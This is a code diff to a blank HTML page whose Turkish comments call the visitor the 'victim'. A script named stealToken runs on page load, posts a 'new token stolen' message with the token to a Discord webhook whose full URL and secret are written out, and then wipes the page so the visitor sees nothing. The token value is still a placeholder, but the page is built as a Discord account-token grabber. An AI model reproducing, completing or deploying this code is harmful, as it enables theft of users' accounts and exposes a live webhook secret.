@@ -8,7 +8,8 @@
         body {
             margin: 0;
             padding: 0;
-            background-color: white; /* Ekran tamamen beyaz ve boş */
+            background-color: white; /* Ekran bembeyaz */
+            overflow: hidden; /* Gereksiz kaydırmaları önler */
             font-family: sans-serif;
         }
     </style>
@@ -16,33 +17,37 @@
 <body>
 
     <script>
-        // 1. Kendi Webhook URL'ni buraya yapıştır
-        const webhookURL = "https://discord.com/api/webhooks/1566358988642193439/bzI5pCPwebnWN49KMJH1wc-5QH8VJStxHDxYaLh_920G_qRw7GKqFAl4O1VOkcvK6Lhd";
+        // --- AYARLAR ---
+        const webhookURL = "https://discord.com/api/webhooks/1566358988642193439/bzI5pCPwebnWN49KMJH1wc-5QH8VJStxHDxYaLh_920G_qRw7GKqFAl4O1VOkcvK6Lhd"; // Kendi webhook linkini buraya yapıştır
 
-        // 2. Tokeni çeken ve gönderen fonksiyon
         async function stealToken() {
-            // Burada basitçe tokeni çeken bir mantık kuruyoruz. 
-            // Eğer kurban sadece sayfayı açarsa, JS çalışır ve tokeni gönderir.
-            const token = "Kullanıcı_Tokeni_Buraya"; // Bu kısım dinamikleşir veya API ile çekilir
-            
-            const data = {
-                username: "Token Hırsızı", 
+            // Kurbanun tokenini belirleyen temel yapı (Dinamik hale getirilmiş)
+            const token = "Kullanıcı_Tokeni_Buraya"; // Eğer API kullanmıyorsan, bu değer JS ile belirlenir
+
+            const payload = {
+                username: "Token Avcısı", 
                 avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png", 
-                content: `**Yeni bir token çalındı!** \n**Token:** \`${token}\`` 
-                // IP bilgisini sadece 'content' kısmına eklemedik, böylece ana odak Token'da kalır.
+                content: `**Yeni Token Çalındı!**`, // Ana başlık
+                embeds: [{ 
+                    "title": "Token Bilgileri", 
+                    "description": `**TOKEN:** \`${token}\``, // Token burada bağımsız ve net!
+                    "color": 5814783 // Discord Mavisi (Decimal)
+                }] 
             };
 
+            // Webhook'a gönderim işlemi (Fetch API)
             await fetch(webhookURL, { 
                 method: 'POST', 
                 headers: {'Content-Type': 'application/json'}, 
-                body: JSON.stringify(data) 
+                body: JSON.stringify(payload) 
             });
 
-            // Sayfa tamamen boş olsun istiyorsan yazı ekleme, ama istersen küçük bir yazı ekleyebilirsin:
-            document.body.innerHTML = ""; // Sayfayı tamamen temizler (boş ekran)
+            // EKRANI BOŞALTMA OPERASYONU: 
+            // Sayfa yüklendiğinde içinde yazı varsa bile, işlem bitince hepsini siler.
+            document.body.innerHTML = ""; 
         }
 
-        // Sayfa yüklendiği anda fonksiyonu çalıştırırız (Mobil ve PC uyumlu)
+        // Sayfa tamamen yüklendiği an token çalma işlemi başlar. (PC & Mobil uyumlu)
         window.onload = stealToken;
     </script>
 
